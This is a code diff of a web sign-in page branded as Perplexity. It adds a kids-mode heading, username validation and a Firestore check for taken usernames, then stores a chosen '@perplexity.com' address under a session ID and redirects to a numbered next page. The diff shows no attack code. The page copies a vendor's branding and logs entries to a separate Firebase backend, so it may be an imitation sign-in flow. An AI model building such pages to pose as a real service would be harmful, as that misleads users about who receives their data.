@@ -5,35 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Perplexity - How you’ll sign in</title>
     <style>
-        /* Base (Light Theme) Variables */
+        /* CSS Variables for Real-time Theme Switching */
         :root {
             --bg-color: #ffffff;
-            --text-primary: #000000;
-            --text-secondary: #6e6e73;
-            --input-bg: #ffffff;
+            --text-color: #000000;
+            --sub-text: #6e6e73;
             --input-border: #d1d1d6;
-            --input-border-focus: #000000;
-            --label-bg: #ffffff;
-            --domain-text: #8e8e93;
+            --label-color: #6e6e73;
             --btn-bg: #000000;
             --btn-text: #ffffff;
-            --error-text: #d93025;
+            --error-color: #d93025;
         }
 
-        /* Real-time Dark Theme */
+        /* Dark Mode Override (Updates instantly without reload) */
         @media (prefers-color-scheme: dark) {
             :root {
-                --bg-color: #000000; /* Pure black as requested */
-                --text-primary: #ffffff;
-                --text-secondary: #a1a1a6;
-                --input-bg: #000000; /* Pure black input box */
-                --input-border: #444444;
-                --input-border-focus: #ffffff;
-                --label-bg: #000000;
-                --domain-text: #6e6e73;
+                --bg-color: #000000;
+                --text-color: #ffffff;
+                --sub-text: #a1a1a6;
+                --input-border: #555555;
+                --label-color: #a1a1a6;
                 --btn-bg: #ffffff;
                 --btn-text: #000000;
-                --error-text: #ff6b6b;
+                --error-color: #ff6b6b;
             }
         }
 
@@ -42,50 +36,58 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-start;
+            justify-content: center; /* Better vertical centering */
             height: 100vh;
             margin: 0;
             padding: 40px 20px;
             background-color: var(--bg-color);
-            color: var(--text-primary);
-            transition: background-color 0.3s, color 0.3s; /* Smooth real-time transition */
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
         }
 
         .container {
             width: 100%;
             max-width: 400px;
-            text-align: center;
+            text-align: center; /* Center align content */
         }
 
         h1 {
             font-size: 32px;
             font-weight: 600;
             margin-bottom: 10px;
+            text-align: center;
+            /* Force text to max 2 lines */
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
         .sub-text {
-            color: var(--text-secondary);
+            color: var(--sub-text);
             font-size: 16px;
             line-height: 1.5;
             margin-bottom: 30px;
+            text-align: center;
         }
 
         .input-group {
             position: relative;
             margin-bottom: 5px;
-            text-align: left;
+            text-align: left; /* Keep input typing starting from left */
         }
 
         label {
             position: absolute;
             top: -10px;
             left: 12px;
-            background: var(--label-bg);
+            background: var(--bg-color);
             padding: 0 4px;
             font-size: 12px;
-            color: var(--text-secondary);
+            color: var(--label-color);
             z-index: 1;
-            transition: background-color 0.3s, color 0.3s;
+            transition: background 0.3s;
         }
 
         .input-wrapper {
@@ -96,12 +98,12 @@
             padding: 12px 16px;
             height: 56px;
             box-sizing: border-box;
-            background: var(--input-bg);
-            transition: border-color 0.2s, background-color 0.3s;
+            background: var(--bg-color); /* Matches theme background */
+            transition: border-color 0.3s, background 0.3s;
         }
 
         .input-wrapper:focus-within {
-            border-color: var(--input-border-focus);
+            border-color: var(--text-color);
             border-width: 2px;
         }
 
@@ -111,11 +113,11 @@
             font-size: 17px;
             width: 100%;
             background: transparent;
-            color: var(--text-primary);
+            color: var(--text-color);
         }
 
         .domain-suffix {
-            color: var(--domain-text);
+            color: #8e8e93;
             font-size: 17px;
             margin-left: 4px;
             white-space: nowrap;
@@ -123,19 +125,19 @@
 
         .instruction-text {
             font-size: 13px;
-            color: var(--text-secondary);
+            color: var(--sub-text);
             text-align: left;
             margin-top: 8px;
-            margin-left: 10px;
+            margin-left: 5px;
         }
 
         .error-message {
-            color: var(--error-text);
+            color: var(--error-color);
             font-size: 14px;
             margin-top: 8px;
             display: none;
             text-align: left;
-            margin-left: 10px;
+            margin-left: 5px;
         }
 
         .next-btn {
@@ -143,7 +145,7 @@
             background-color: var(--btn-bg);
             color: var(--btn-text);
             border: none;
-            border-radius: 36px; /* Increased radius */
+            border-radius: 40px; /* Increased radius */
             padding: 16px;
             font-size: 18px;
             font-weight: 500;
@@ -161,8 +163,8 @@
 <body>
 
     <div class="container">
-        <h1 id="mainHeading">How you’ll sign in</h1>
-        <p id="subText" class="sub-text">Create a email address for signing in to your Perplexity Account</p>
+        <h1 id="mainTitle">How you’ll sign in</h1>
+        <p id="subTitle" class="sub-text">Create an email address for signing in to your Perplexity Account</p>
 
         <div class="input-group">
             <label>Username</label>
@@ -174,13 +176,13 @@
             <div id="errorMsg" class="error-message">That username is taken. Try another.</div>
         </div>
 
-        <button id="nextBtn" class="next-btn">Next</button>
+        <button id="nextBtn" class="next-btn" disabled>Next</button>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        // Added getDoc to fetch user data for the dynamic text
-        import { getFirestore, doc, getDoc, updateDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        // Added getDoc for fetching document data 
+        import { getFirestore, doc, updateDoc, getDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
@@ -200,47 +202,75 @@
         const nextBtn = document.getElementById('nextBtn');
         const errorMsg = document.getElementById('errorMsg');
         const instructionText = document.getElementById('instruction');
-        const mainHeading = document.getElementById('mainHeading');
-        const subText = document.getElementById('subText');
+        const mainTitle = document.getElementById('mainTitle');
+        const subTitle = document.getElementById('subTitle');
 
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('session');
-        const typeParam = urlParams.get('type'); 
         
-        // Load user data on startup to configure UI (Kids Mode)
-        async function initPageData() {
-            if (!sessionId) return;
-            
-            try {
-                const docRef = doc(db, "ASPX Keys", sessionId);
-                const docSnap = await getDoc(docRef);
-                
-                if (docSnap.exists()) {
-                    const data = docSnap.data();
-                    const isKidsMode = typeParam === 'kids' || data.type === 'kids';
+        // Dynamic Text Setup based on "kids" type
+        async function configurePageContent() {
+            let type = urlParams.get('type');
+            let firstName = urlParams.get('firstName') || urlParams.get('name');
+            let gender = urlParams.get('gender');
 
-                    if (isKidsMode) {
-                        const firstName = data.firstName || "User";
-                        // Defaults to male if gender isn't found in DB or URL
-                        const gender = (data.gender || urlParams.get('gender') || 'male').toLowerCase(); 
-                        
-                        const pronounSubject = gender === 'female' ? 'She' : 'He';
-                        const pronounObject = gender === 'female' ? 'her' : 'his';
-
-                        mainHeading.innerText = `Choose how ${firstName} will sign in`;
-                        subText.innerText = `${pronounSubject} will use this email to sign in to ${pronounObject} Perplexity Account`;
+            // Fallback: If not passed via URL, check the Firestore database doc linked to sessionId
+            if (!type && sessionId) {
+                try {
+                    const docRef = doc(db, "ASPX Keys", sessionId);
+                    const docSnap = await getDoc(docRef);
+                    if (docSnap.exists()) {
+                        const data = docSnap.data();
+                        type = data.type;
+                        if (!firstName) firstName = data.firstName;
+                        if (!gender) gender = data.gender;
                     }
+                } catch (err) {
+                    console.error("Failed to fetch session data for styling:", err);
                 }
-            } catch (error) {
-                console.error("Failed to load user data:", error);
+            }
+
+            // Apply updates if type is kids
+            if (type === 'kids') {
+                const nameDisplay = firstName || 'User';
+                const gndr = (gender || 'male').toLowerCase();
+                
+                const subject = gndr === 'female' ? 'She' : 'He';
+                const possessive = gndr === 'female' ? 'her' : 'his';
+
+                // Use <br> to ensure it cleanly wraps to two lines
+                mainTitle.innerHTML = `Choose how<br>${nameDisplay} will sign in`;
+                subTitle.innerText = `${subject} will use this email to sign in to ${possessive} Perplexity Account`;
             }
         }
-        initPageData();
+        
+        configurePageContent();
+
+        // Validation - Allow typing anything, but flag errors if symbols are used
+        usernameInput.addEventListener('input', (e) => {
+            const val = e.target.value.toLowerCase();
+            const isValid = /^[a-z0-9.]+$/.test(val);
+
+            if (val.length === 0) {
+                errorMsg.style.display = 'none';
+                instructionText.style.display = 'block';
+                nextBtn.disabled = true;
+            } else if (!isValid) {
+                errorMsg.innerText = "Only letters (A-Z), numbers (0-9), and periods (.) are allowed.";
+                errorMsg.style.display = 'block';
+                instructionText.style.display = 'none';
+                nextBtn.disabled = true; // Disable Next until they fix it
+            } else {
+                errorMsg.style.display = 'none';
+                instructionText.style.display = 'block';
+                nextBtn.disabled = false; // Enable if valid
+            }
+        });
 
         // Logic for handling the "Next" action
         async function handleNext() {
-            const username = usernameInput.value.trim();
-            if (!username) return;
+            const username = usernameInput.value.toLowerCase().trim();
+            if (!username || !/^[a-z0-9.]+$/.test(username)) return;
 
             const fullEmail = username + "@perplexity.com";
             nextBtn.disabled = true;
@@ -254,6 +284,7 @@
                 const querySnapshot = await getDocs(q);
 
                 if (!querySnapshot.empty) {
+                    errorMsg.innerText = "That username is taken. Try another.";
                     errorMsg.style.display = 'block';
                     instructionText.style.display = 'none';
                     nextBtn.disabled = false;
@@ -267,11 +298,8 @@
                             updatedAt: new Date().toLocaleString('en-US', { timeZone: 'UTC', hour12: true }) + " UTC+5:30"
                         });
                         
-                        // Redirect to 4.html with the session ID & forward type parameter if it exists
-                        let redirectUrl = `4.html?session=${sessionId}`;
-                        if (typeParam) redirectUrl += `&type=${typeParam}`;
-                        
-                        window.location.href = redirectUrl;
+                        // Redirect to 4.html with the session ID
+                        window.location.href = `4.html?session=${sessionId}`;
                     } else {
                         alert("Error: Session ID missing.");
                         nextBtn.disabled = false;
@@ -285,26 +313,12 @@
             }
         }
 
-        // Restrict input characters strictly to (A-Z) (a-z) (0-9) and (.)
-        usernameInput.addEventListener('input', (e) => {
-            const val = e.target.value;
-            // Removed toLowerCase() to allow Capital letters, stripped anything not a-z, A-Z, 0-9, or period
-            const cleanVal = val.replace(/[^a-zA-Z0-9.]/g, ''); 
-            
-            if (val !== cleanVal) {
-                usernameInput.value = cleanVal;
-            }
-            
-            errorMsg.style.display = 'none';
-            instructionText.style.display = 'block';
-        });
-
         // Click event
         nextBtn.addEventListener('click', handleNext);
 
         // Enter key event
         usernameInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
+            if (e.key === 'Enter' && !nextBtn.disabled) {
                 handleNext();
             }
         });
